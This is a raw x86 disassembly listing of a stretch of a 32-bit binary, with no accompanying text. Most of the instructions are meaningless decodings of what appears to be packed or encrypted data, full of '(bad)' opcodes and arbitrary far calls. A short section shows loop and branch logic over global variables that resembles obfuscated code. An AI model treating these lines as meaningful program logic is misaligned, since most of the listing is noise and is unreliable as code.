  40bd8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd8c:	out    0x62,eax
  40bd8e:	aad    0x7e
  40bd90:	loop   0x40bdcf
  40bd92:	and    al,0xd3
  40bd94:	dec    eax
  40bd95:	popf   
  40bd96:	fdiv   st,st(6)
  40bd98:	inc    edi
  40bd99:	call   0x8dc9d180
  40bd9e:	ffree  st(1)
  40bda0:	push   edi
  40bda1:	ss cli 
  40bda3:	aas    
  40bda4:	psraw  mm1,QWORD PTR fs:[ebx]
  40bda8:	jns    0x40bd4e
  40bdaa:	pop    ss
  40bdab:	dec    esp
  40bdac:	mov    cl,0x16
  40bdae:	int3   
  40bdaf:	outs   dx,BYTE PTR ds:[esi]
  40bdb0:	mov    cl,0xfd
  40bdb2:	jp     0x40bd4b
  40bdb4:	pop    ecx
  40bdb5:	int3   
  40bdb6:	and    BYTE PTR [edi],ah
  40bdb8:	mov    ds:0xde9d20d0,al
  40bdbd:	pushf  
  40bdbe:	(bad)  
  40bdc0:	jmp    0x40bd74
  40bdc2:	cli    
  40bdc3:	pop    edi
  40bdc4:	sar    BYTE PTR [edi-0x60d74ba0],cl
  40bdca:	call   0xa57b:0x1a3a9a02
  40bdd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdd2:	outs   dx,BYTE PTR ds:[si]
  40bdd4:	stos   DWORD PTR es:[edi],eax
  40bdd5:	adc    ebp,DWORD PTR [ebx+0x48b273f0]
  40bddb:	jmp    0x2c7f:0x886157b3
  40bde2:	cmp    DWORD PTR [ebp-0x77],0x2c
  40bde6:	fistp  WORD PTR [ecx+0x7c]
  40bde9:	xchg   esi,eax
  40bdea:	lods   al,BYTE PTR ds:[esi]
  40bdeb:	das    
  40bdec:	in     al,0xb6
  40bdee:	in     al,dx
  40bdef:	popa   
  40bdf0:	or     dh,BYTE PTR [esi+edx*8+0x234b4bd]
  40bdf7:	outs   dx,DWORD PTR ds:[esi]
  40bdf8:	mov    dl,0xd0
  40bdfa:	or     eax,0xb7602e38
  40bdff:	(bad)  
  40be00:	fmul   QWORD PTR [ebp+0x7c088a12]
  40be06:	push   ebx
  40be07:	aas    
  40be08:	lods   eax,DWORD PTR ds:[esi]
  40be09:	push   edi
  40be0a:	outs   dx,BYTE PTR ds:[esi]
  40be0b:	dec    edi
  40be0c:	rol    BYTE PTR [edx-0xd],cl
  40be0f:	and    BYTE PTR [esi-0x24],bh
  40be12:	inc    edx
  40be13:	and    BYTE PTR [edi+0x2],0x54
  40be17:	in     eax,0x7f
  40be19:	cmp    BYTE PTR [eax+0x3576c38e],al
  40be1f:	dec    eax
  40be20:	fld    QWORD PTR [edi+0x18]
  40be23:	pop    ebx
  40be24:	and    eax,0x1fe677a1
  40be29:	cmp    al,0xaa
  40be2b:	jge    0x40be18
  40be2d:	pop    ss
  40be2e:	pop    esi
  40be2f:	adc    DWORD PTR [eax-0x67],0xffffffd4
  40be33:	mov    eax,0xf81f5fce
  40be38:	cmp    DWORD PTR [ebx+0x2b],0xc
  40be3c:	jg     0x40be3c
  40be3e:	xlat   BYTE PTR ds:[ebx]
  40be3f:	ret    
  40be40:	sar    DWORD PTR [esi],0xc7
  40be43:	int3   
  40be44:	adc    ebp,DWORD PTR [eax+0x2b]
  40be47:	(bad)  
  40be48:	add    esp,ebp
  40be4a:	sti    
  40be4b:	and    eax,0xbbb4f391
  40be50:	push   ss
  40be51:	cmp    dl,BYTE PTR [ebx+0x62]
  40be54:	out    dx,al
  40be55:	scas   al,BYTE PTR es:[edi]
  40be56:	push   ss
  40be57:	xor    DWORD PTR [ebx+edi*1+0x397d0bb5],0x109557c7
  40be62:	(bad)  
  40be63:	cmp    edx,DWORD PTR [edx+0x67]
  40be66:	mov    ds:0x1a55adb2,eax
  40be6b:	jecxz  0x40beb8
  40be6d:	call   0xb3e3:0x2c568a6c
  40be74:	ins    BYTE PTR es:[edi],dx
  40be75:	ror    ecx,0x27
  40be78:	ss push edi
  40be7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7c:	mov    edx,0xeebeacb5
  40be81:	rcl    esi,0xd
  40be84:	aad    0x76
  40be86:	inc    esp
  40be87:	lods   eax,DWORD PTR ds:[esi]
  40be88:	mov    ds,WORD PTR [esi-0x7c]
  40be8b:	cmp    al,0x31
  40be8d:	xchg   DWORD PTR [edx-0x65],ebx
  40be90:	mov    ds:0xf1b3403b,eax
  40be95:	xchg   DWORD PTR [ecx],ebx
  40be97:	or     ecx,DWORD PTR [ebx+0x4e1b53e]
  40be9d:	jne    0x40be44
  40be9f:	xchg   edi,eax
  40bea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bea1:	sub    edx,DWORD PTR [edi]
  40bea3:	sub    edi,DWORD PTR [eax]
  40bea5:	test   al,0x20
  40bea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea8:	cmp    al,ch
  40beaa:	mov    edx,0x25e02b6e
  40beaf:	mov    ds:0xa1087d8b,eax
  40beb4:	xor    eax,0xc7004244
  40beb9:	add    eax,0x420e9e
  40bebe:	sbb    BYTE PTR [eax],al
  40bec0:	add    BYTE PTR [eax],al
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	xchg   ecx,eax
  40c013:	jbe    0x40c058
  40c015:	mov    al,0xd4
  40c017:	jmp    0x5f5a3a96
  40c01c:	jp     0x40c098
  40c01e:	adc    BYTE PTR [edx],ch
  40c020:	outs   dx,BYTE PTR ds:[esi]
  40c021:	sbb    al,0xb9
  40c023:	xchg   BYTE PTR [edx],ch
  40c025:	jae    0x40c055
  40c027:	cmp    BYTE PTR [ebx-0x59],al
  40c02a:	mov    ebp,0xb592ad07
  40c02f:	push   edi
  40c030:	arpl   WORD PTR [ebx-0x3f],sp
  40c033:	dec    esi
  40c034:	out    0xd9,al
  40c036:	pop    ebx
  40c037:	inc    ebx
  40c038:	push   esp
  40c039:	(bad)  
  40c03a:	jnp    0x40c04d
  40c03c:	in     eax,dx
  40c03d:	xor    bl,BYTE PTR [ecx]
  40c03f:	dec    ebp
  40c040:	or     ecx,0x62
  40c043:	cdq    
  40c044:	rol    dh,0xbc
  40c047:	xchg   ecx,eax
  40c048:	pop    edx
  40c049:	ror    ch,0x7e
  40c04c:	add    DWORD PTR [ebx-0x3eb91daa],ecx
  40c052:	inc    edi
  40c053:	mov    bl,0x14
  40c055:	sbb    eax,0x998ab785
  40c05a:	fsub   DWORD PTR [esi+0x3d7ddb55]
  40c060:	and    cl,BYTE PTR [eax-0x4c]
  40c063:	pushf  
  40c064:	mov    edx,0x664d0ca8
  40c069:	xor    ebp,ebx
  40c06b:	mov    ah,0xc7
  40c06d:	dec    edx
  40c06e:	sub    cl,dh
  40c070:	or     eax,0x14e2f6eb
  40c075:	adc    DWORD PTR [ebx+ebp*1+0x4a49f5d4],0x56
  40c07d:	pop    ebp
  40c07e:	test   BYTE PTR [ebx],al
  40c080:	loope  0x40c036
  40c082:	pop    ds
  40c083:	test   eax,0xe5343e1c
  40c088:	fdiv   DWORD PTR [eax]
  40c08a:	test   DWORD PTR [edx-0xf24b61c],0x5af59f9b
  40c094:	pop    ecx
  40c095:	outs   dx,BYTE PTR ds:[esi]
  40c096:	mov    esi,0x98c26442
  40c09b:	ja     0x40c0c3
  40c09d:	stos   BYTE PTR es:[edi],al
  40c09e:	jg     0x40c0e4
  40c0a0:	xlat   BYTE PTR ds:[ebx]
  40c0a1:	pop    edx
  40c0a2:	and    al,0xf3
  40c0a4:	(bad)  
  40c0a5:	mov    ah,0x21
  40c0a7:	in     eax,0x1e
  40c0a9:	out    dx,eax
  40c0aa:	or     DWORD PTR [esi-0x7],edx
  40c0ad:	xchg   edi,eax
  40c0ae:	out    0xcd,eax
  40c0b0:	and    eax,0xd170b41c
  40c0b5:	adc    eax,0x1ae21354
  40c0ba:	mov    al,ds:0x9f174b4d
  40c0bf:	xchg   esp,eax
  40c0c0:	sub    al,BYTE PTR [ecx-0x395a332e]
  40c0c6:	fild   DWORD PTR [ecx+eiz*4]
  40c0c9:	pop    cx
  40c0cb:	push   ds
  40c0cc:	push   ss
  40c0cd:	jno    0x40c056
  40c0cf:	or     BYTE PTR [edi-0x4f97c494],dh
  40c0d5:	mov    ds:0x1b15b722,eax
  40c0da:	lds    esi,FWORD PTR [edi+0x1dd31a46]
  40c0e0:	adc    bl,dh
  40c0e2:	div    BYTE PTR [edi]
  40c0e4:	enter  0x6c04,0x87
  40c0e8:	lods   eax,DWORD PTR ds:[esi]
  40c0e9:	mov    dl,0x35
  40c0eb:	inc    ebx
  40c0ec:	sbb    ebx,ebx
  40c0ee:	int    0xd9
  40c0f0:	add    esp,edx
  40c0f2:	push   eax
  40c0f3:	jb     0x40c07a
  40c0f5:	and    BYTE PTR [edi+eiz*1],ah
  40c0f8:	jne    0x40c0e5
  40c0fa:	push   0x8d4a00ff
  40c0ff:	test   al,0x2d
  40c101:	out    0x60,eax
  40c103:	inc    ebp
  40c104:	aaa    
  40c105:	cdq    
  40c106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c107:	iret   
  40c108:	and    eax,0x232690ca
  40c10d:	inc    eax
  40c10e:	xor    BYTE PTR [edi+0x29],dl
  40c111:	jne    0x40c124
  40c113:	inc    edx
  40c114:	sbb    eax,0x36a8706
  40c119:	pop    ecx
  40c11a:	xchg   ebp,ebx
  40c11c:	ja     0x40c10d
  40c11e:	cmp    edi,ebp
  40c120:	xchg   edx,eax
  40c121:	imul   ebx,DWORD PTR [ecx],0x9219c5e
  40c127:	fs out dx,al
  40c129:	in     eax,dx
  40c12a:	mov    dh,0x36
  40c12c:	(bad)  
  40c12d:	cwde   
  40c12e:	out    dx,eax
  40c12f:	pop    edx
  40c130:	jge    0x40c132
  40c132:	sub    DWORD PTR ds:[edx],0xc7c54cc1
  40c139:	sti    
  40c13a:	ret    0x361b
  40c13d:	sbb    BYTE PTR [ebx+0x27],bh
  40c140:	add    al,0xeb
  40c142:	sub    al,0x53
  40c144:	jg     0x40c194
  40c146:	cs cmp eax,0x140153e7
  40c14c:	in     eax,dx
  40c14d:	and    al,0xa1
  40c14f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c150:	mul    BYTE PTR ds:0x7147270
  40c156:	mov    al,0x94
  40c158:	out    dx,al
  40c159:	inc    ebx
  40c15a:	mov    DWORD PTR [ebp-0x56],eax
  40c15d:	inc    ebp
  40c15e:	out    dx,al
  40c15f:	stos   BYTE PTR es:[edi],al
  40c160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c161:	inc    edx
  40c162:	xchg   BYTE PTR [ebx+0x45affad2],ch
  40c168:	add    bh,BYTE PTR [ebx+0x42]
  40c16b:	pop    ebx
  40c16c:	(bad)  
  40c16d:	xor    bh,BYTE PTR [edi-0x712d355b]
  40c173:	cli    
  40c174:	idiv   DWORD PTR [eax-0x1f]
  40c177:	inc    esi
  40c178:	rcr    WORD PTR [edx],0x73
  40c17c:	mov    dl,0x74
  40c17e:	pushf  
  40c17f:	sbb    eax,0x316998ba
  40c184:	push   edx
  40c185:	cmp    DWORD PTR [edx+0x4e],esp
  40c188:	add    DWORD PTR ds:0xe3dd69af,edx
  40c18e:	fld    DWORD PTR [edx-0xc9b8e1]
  40c194:	jae    0x40c130
  40c196:	cmp    edi,0x8
  40c199:	sub    esi,esi
  40c19b:	sbb    esi,edx
  40c19d:	mov    eax,ds:0x861bdaf4
  40c1a2:	cmp    BYTE PTR ds:0x75758e10,dh
  40c1a8:	push   eax
  40c1a9:	mov    DWORD PTR [ebx],esp
  40c1ab:	xchg   ebp,eax
  40c1ac:	mov    ds:0x99755036,al
  40c1b1:	stc    
  40c1b2:	mov    edx,0xfca4663c
  40c1b7:	add    edi,DWORD PTR [edx+edi*4]
  40c1ba:	pop    ds
  40c1bb:	pop    ebp
  40c1bc:	sbb    al,0x6f
  40c1be:	call   0xec5c:0x393ee241
  40c1c5:	out    dx,eax
  40c1c6:	push   edi
  40c1c7:	sbb    al,0xf2
  40c1c9:	mov    cl,0xb4
  40c1cb:	cwde   
  40c1cc:	or     BYTE PTR [eax-0x3856a02f],bl
  40c1d2:	or     DWORD PTR [edi-0x15a22adf],edx
  40c1d8:	stc    
  40c1d9:	sbb    eax,0xd9e71c2b
  40c1de:	push   0xa5c7961d
  40c1e3:	shr    BYTE PTR [edi],0xac
  40c1e6:	add    BYTE PTR [esi-0x6f],0xa
  40c1ea:	add    DWORD PTR [ebx-0x42],edi
  40c1ed:	out    dx,al
  40c1ee:	cmp    ch,dh
  40c1f0:	js     0x40c23c
  40c1f2:	pshufw mm5,mm5,0x6b
  40c1f6:	or     al,0xae
  40c1f8:	mov    ebp,0x52abcf73
  40c1fd:	leave  
  40c1fe:	imul   edx,ebx,0x47
  40c201:	iret   
  40c202:	arpl   si,bp
  40c204:	or     al,0x34
  40c206:	test   al,0xc8
  40c208:	inc    esi
  40c209:	cs leave 
  40c20b:	es aad 0xcf
  40c20e:	sbb    eax,0x263db501
  40c213:	retf   0xb35e
  40c216:	repz in eax,0xee
  40c219:	sub    dl,dl
  40c21b:	and    al,BYTE PTR [edx]
  40c21d:	xor    cl,cl
  40c21f:	lods   eax,DWORD PTR ds:[esi]
  40c220:	mov    al,ds:0x3d247268
  40c225:	outs   dx,BYTE PTR ds:[esi]
  40c226:	push   esi
  40c227:	push   ebx
  40c228:	lock xchg esp,eax
  40c22a:	sbb    al,0x73
  40c22c:	add    ecx,DWORD PTR [edi+edx*4+0x7053c9a7]
  40c233:	pop    ds
  40c234:	mov    eax,ds:0x9d0f664b
  40c239:	ret    
  40c23a:	stc    
  40c23b:	sub    bh,BYTE PTR [edi+0x67]
  40c23e:	xor    dh,BYTE PTR [esi]
  40c240:	jmp    0xd53a:0x47d28e04
  40c247:	mov    bl,0xb9
  40c249:	cmp    al,0x5e
  40c24b:	add    edi,DWORD PTR [esp+ecx*8+0x56ec74e4]
  40c252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c253:	scas   al,BYTE PTR es:[edi]
  40c254:	test   al,0x6a
  40c256:	fiadd  WORD PTR [ebx]
  40c258:	call   0xcf9e:0xc9c079b
  40c25f:	and    cl,al
  40c261:	jecxz  0x40c1e8
  40c263:	adc    ecx,ecx
  40c265:	push   ebp
  40c266:	ret    0xd8d7
  40c269:	in     al,0x1c
  40c26b:	dec    ebx
  40c26c:	imul   ebp,DWORD PTR [edi],0xffffffcd
  40c26f:	out    dx,eax
  40c270:	jecxz  0x40c290
  40c272:	(bad)
  40c277:	dec    ecx
  40c278:	mov    dh,0x9d
  40c27a:	neg    BYTE PTR [esi+0x153bb413]
  40c280:	rcr    BYTE PTR [ebx+eax*1+0x9be1977],cl
  40c287:	enter  0x28bf,0x9e
  40c28b:	sbb    edx,DWORD PTR [eax-0x3c16ed13]
  40c291:	aas    
  40c292:	lds    ebp,FWORD PTR [edx+0x5872f349]
  40c298:	adc    esi,DWORD PTR es:0x9985d857
  40c29f:	imul   esi,DWORD PTR [ecx],0x7ed9930c
  40c2a5:	sub    eax,0xe876e339
  40c2aa:	xor    BYTE PTR ss:[eax],0xc1
  40c2ae:	(bad)  
  40c2af:	jmp    0x40c2bb
  40c2b1:	xchg   esp,eax
  40c2b2:	sbb    esi,edx
  40c2b4:	ds pop esp
  40c2b6:	daa    
  40c2b7:	pop    edi
  40c2b8:	shl    DWORD PTR [ebx+ebx*2+0x40],cl
  40c2bc:	sub    eax,0x1720337c
  40c2c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2c3:	inc    edi
  40c2c4:	pop    ecx
  40c2c5:	in     al,0xfb
  40c2c7:	jno    0x40c26c
  40c2c9:	mov    ds:0xd73c97ad,al
  40c2ce:	xchg   si,ax
  40c2d0:	mov    ch,0x9f
  40c2d2:	xchg   ebx,eax
  40c2d3:	cmp    esp,DWORD PTR [esi]
  40c2d5:	jb     0x40c2f2
  40c2d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2d8:	out    dx,al
  40c2d9:	sti    
  40c2da:	inc    ebp
  40c2db:	lods   al,BYTE PTR ds:[esi]
  40c2dc:	push   0xffffffae
  40c2de:	mov    esi,0xb8dbe80
  40c2e3:	mov    ebp,0x4642ccb1
  40c2e8:	sub    esi,ecx
  40c2ea:	sbb    dl,BYTE PTR [edi+eiz*2+0x30]
  40c2ee:	clc    
  40c2ef:	icebp  
  40c2f0:	mov    ss,WORD PTR [ebp-0x50]
  40c2f3:	repnz cs test eax,0xaa57a346
  40c2fa:	(bad)  
  40c2fb:	stc    
  40c2fc:	sbb    eax,0x8fa88d2c
  40c301:	int3   
  40c302:	js     0x40c341
  40c304:	adc    edi,DWORD PTR [ecx+0x10430dc2]
  40c30a:	pop    eax
  40c30b:	sub    eax,0xb877112b
  40c310:	arpl   WORD PTR [ecx-0x75],si
  40c313:	mov    eax,DWORD PTR ds:[edi-0x11]
  40c317:	into   
  40c318:	lods   eax,DWORD PTR ds:[esi]
  40c319:	mov    al,al
  40c31b:	dec    esp
  40c31c:	add    al,0xde
  40c31e:	add    DWORD PTR [eax],esi
  40c320:	test   BYTE PTR [ecx-0x11],bl
  40c323:	cmp    BYTE PTR [edx-0x6e98a0c9],al
  40c329:	or     DWORD PTR [ebx],ebp
  40c32b:	mov    eax,ds:0x86012665
  40c330:	je     0x40c399
  40c332:	mov    dl,0xd5
  40c334:	push   es
  40c335:	pusha  
  40c336:	xor    BYTE PTR [ebp+eax*8-0x3d4e409a],ah
  40c33d:	lods   al,BYTE PTR ds:[esi]
  40c33e:	not    DWORD PTR [edx+0x7]
  40c341:	and    ch,BYTE PTR [ebp+0x51]
  40c344:	mov    dl,0x6d
  40c346:	fld    QWORD PTR [eax-0x7d]
  40c349:	xlat   BYTE PTR ds:[ebx]
  40c34a:	adc    eax,0xfb8a43da
  40c34f:	jno    0x40c371
  40c351:	mov    ch,0xba
  40c353:	out    dx,al
  40c354:	pop    edi
  40c355:	cmp    eax,0xaddc2ced
  40c35a:	inc    edi
  40c35b:	addr16 clc 
  40c35d:	(bad)  
  40c35e:	clc    
  40c35f:	je     0x40c31d
  40c361:	dec    ebx
  40c362:	or     DWORD PTR [ecx],ebx
  40c364:	xchg   ebx,eax
  40c365:	jl     0x40c379
  40c367:	inc    ecx
  40c368:	mov    ds:0x8d2d6205,al
  40c36d:	arpl   WORD PTR [edx],cx
  40c36f:	fisttp DWORD PTR [ebp+0x66]
  40c372:	push   esi
  40c373:	es (bad) 
  40c375:	shr    BYTE PTR [ebx+0xabfa736],1
  40c37b:	mov    bh,0x22
  40c37d:	imul   eax,DWORD PTR fs:[edx-0x7afcf38a],0xffffffd9
  40c385:	sbb    cl,BYTE PTR [ecx-0x29]
  40c388:	in     al,dx
  40c389:	enter  0x9d44,0x9e
  40c38d:	cmp    ebp,DWORD PTR [esi+0x15]
  40c390:	les    eax,FWORD PTR [edx]
  40c392:	fxch   st(1)
  40c394:	test   eax,0xf22fda9a
  40c399:	mov    ch,BYTE PTR [esi+0x29]
  40c39c:	sbb    ebp,edi
  40c39e:	daa    
  40c39f:	cmp    al,BYTE PTR [ebx]
  40c3a1:	push   edx
  40c3a2:	xlat   BYTE PTR ds:[ebx]
  40c3a3:	stos   DWORD PTR es:[edi],eax
  40c3a4:	cmp    edi,DWORD PTR [esi]
  40c3a6:	fwait
  40c3a7:	enter  0x8e91,0x7d
  40c3ab:	sub    ebx,DWORD PTR [edi-0x7fbd94]
  40c3b1:	cmp    BYTE PTR [esi],bl
  40c3b3:	cmp    BYTE PTR [edx],bl
  40c3b5:	xchg   esi,eax
  40c3b6:	das    
  40c3b7:	mov    al,0xac
  40c3b9:	bound  ebp,QWORD PTR [ecx+ebx*1]
  40c3bc:	cdq    
  40c3bd:	dec    ebp
  40c3be:	xchg   ebx,eax
  40c3bf:	ds mov edi,0xd21a0e56
  40c3c5:	ret    0xb78e
  40c3c8:	test   eax,0x8f3ca408
  40c3cd:	std    
  40c3ce:	mov    eax,ds:0xef82321f
  40c3d3:	jnp    0x40c418
  40c3d5:	stc    
  40c3d6:	lds    eax,FWORD PTR ds:0x3dc93b42
  40c3dc:	xchg   ecx,eax
  40c3dd:	fst    DWORD PTR [ebp+0x79b31bd3]
  40c3e3:	into   
  40c3e4:	mov    al,bl
  40c3e6:	jg     0x40c44d
  40c3e8:	dec    ebp
  40c3e9:	mov    bl,0x8a
  40c3eb:	sbb    DWORD PTR ds:0xbc33635,esp
  40c3f1:	mov    ebx,esi
  40c3f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3f4:	cmp    ecx,edi
  40c3f6:	and    dl,0x38
  40c3f9:	pusha  
  40c3fa:	add    esi,esi
  40c3fc:	aas    
  40c3fd:	sub    eax,0xea1d2e16
  40c402:	jmp    0x40c3cc
  40c404:	push   edx
  40c405:	pop    eax
  40c406:	fxch   st(5)
  40c408:	lock or DWORD PTR [ecx-0x57847a44],edi
  40c40f:	dec    edx
  40c410:	iret   
  40c411:	jbe    0x40c454
  40c413:	mov    bh,0xe5
  40c415:	inc    ebp
  40c416:	pop    ecx
  40c417:	(bad)  
  40c419:	(bad)  
  40c41a:	xchg   DWORD PTR [ebx],ebx
  40c41c:	push   0xfa4798e1
  40c421:	jne    0x40c447
  40c423:	sub    BYTE PTR [edi],dh
  40c425:	pop    edx
  40c426:	shl    DWORD PTR [ecx+0x6a],0x49
  40c42a:	imul   ebp,DWORD PTR [ecx+0x2],0xffffffa2
  40c42e:	scas   eax,DWORD PTR es:[edi]
  40c42f:	imul   ebx,DWORD PTR [ecx],0x3a
  40c432:	mov    ah,BYTE PTR [edx-0x200a21de]
  40c438:	mov    ebx,0x36d956bc
  40c43d:	sub    BYTE PTR [esp+eiz*4-0x40],ch
  40c441:	xchg   ebx,eax
  40c442:	inc    ebp
  40c443:	lods   al,BYTE PTR ds:[esi]
  40c444:	test   al,0x6e
  40c446:	stos   BYTE PTR es:[edi],al
  40c447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c448:	les    edx,FWORD PTR [eax+esi*2-0x458fb798]
  40c44f:	fld    DWORD PTR fs:[edx-0x2d]
  40c453:	ss sub al,0xbf
  40c456:	adc    BYTE PTR [eax+0x5db3a4f5],cl
  40c45c:	mov    eax,0x1e927b70
  40c461:	jge    0x40c4e2
  40c463:	mov    edi,DWORD PTR [edi]
  40c465:	addr16 xor eax,0xfdd9163d
  40c46b:	mov    eax,ds:0xe6067c7d
  40c470:	cs jg  0x40c4d2
  40c473:	stos   DWORD PTR es:[edi],eax
  40c474:	pushf  
  40c475:	fst    DWORD PTR [edi-0x4bc5ab47]
  40c47b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c47c:	pop    ebx
  40c47d:	scas   eax,DWORD PTR es:[edi]
  40c47e:	outs   dx,BYTE PTR ds:[esi]
  40c47f:	sbb    BYTE PTR cs:0x8a3d4d09,bl
  40c486:	jge    0x40c411
  40c488:	(bad)
  40c48c:	jg     0x40c453
  40c48e:	rol    DWORD PTR [ecx-0x74],0xa8
  40c492:	add    al,0x2d
  40c494:	pop    edi
  40c495:	ins    DWORD PTR es:[edi],dx
  40c496:	jmp    0x2c6fb42d
  40c49b:	mov    BYTE PTR [ecx+edx*1],cl
  40c49e:	push   ds
  40c49f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4a0:	call   0xac8b38e6
  40c4a5:	adc    DWORD PTR [edi],ebp
  40c4a7:	out    0xb0,ax
  40c4aa:	fisttp DWORD PTR [eax]
  40c4ac:	jecxz  0x40c47a
  40c4ae:	add    eax,0x6d2a1c55
  40c4b3:	nop
  40c4b4:	shr    DWORD PTR [eax+edx*1],1
  40c4b7:	daa    
  40c4b8:	mov    al,ds:0x2c192574
  40c4bd:	cs ins DWORD PTR es:[edi],dx
  40c4bf:	ret    
  40c4c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4c1:	xchg   ebp,eax
  40c4c2:	outs   dx,BYTE PTR ds:[esi]
  40c4c3:	mov    eax,0x9db15799
  40c4c8:	repnz xor DWORD PTR [edx+0x224ed6b9],esi
  40c4cf:	push   ss
  40c4d0:	sbb    al,0x98
  40c4d2:	int3   
  40c4d3:	aad    0xe2
  40c4d5:	dec    ebp
  40c4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d7:	in     al,0x57
  40c4d9:	push   ebp
  40c4da:	pop    ebx
  40c4db:	sbb    eax,0xc54cacf3
  40c4e0:	xchg   eax,eax
  40c4e2:	add    bh,cl
  40c4e4:	shl    ebp,1
  40c4e6:	xchg   edx,edi
  40c4e8:	dec    esi
  40c4e9:	push   es
  40c4ea:	pop    ecx
  40c4eb:	sub    ebp,eax
  40c4ed:	push   ss
  40c4ee:	(bad)  
  40c4ef:	icebp  
  40c4f0:	frstor [ecx+0x1b]
  40c4f3:	sbb    esp,0x276b0ff
  40c4f9:	stos   BYTE PTR es:[edi],al
  40c4fa:	and    ah,BYTE PTR [ebx]
  40c4fc:	mov    dh,0x91
  40c4fe:	xlat   BYTE PTR ds:[ebx]
  40c4ff:	cmp    ebp,DWORD PTR [edi]
  40c501:	xor    eax,0xe5f68e8b
  40c506:	adc    eax,0x4af1b3cb
  40c50b:	fstp   DWORD PTR [ecx+0x331a9258]
  40c511:	(bad)  
  40c512:	push   ecx
  40c513:	xor    eax,0xb1184536
  40c518:	shl    edx,0x38
  40c51b:	mov    eax,ds:0xe6be06bd
  40c520:	loopne 0x40c516
  40c522:	fwait
  40c523:	cmp    DWORD PTR [eax+0x78],eax
  40c526:	arpl   ax,dx
  40c528:	jmp    DWORD PTR [edx-0x72053c03]
  40c52e:	adc    ebp,DWORD PTR [ebp+0x6d5d94c4]
  40c534:	repnz ins BYTE PTR es:[edi],dx
  40c536:	inc    edx
  40c537:	jg     0x40c506
  40c539:	or     ebp,ebx
  40c53b:	es jecxz 0x40c513
  40c53e:	(bad)  [edx+edi*2+0x72]
  40c542:	shl    BYTE PTR [esi+0x7d],1
  40c545:	test   al,0x3d
  40c547:	push   0xc85221af
  40c54c:	inc    ebx
  40c54d:	jae    0x40c52b
  40c54f:	and    eax,0xdf30ed6b
  40c554:	push   edi
  40c555:	dec    esp
  40c556:	data16 sbb BYTE PTR [eax],ch
  40c559:	or     BYTE PTR [edx+0x4c],al
  40c55c:	push   esp
  40c55d:	(bad)  
  40c55e:	in     eax,0x23
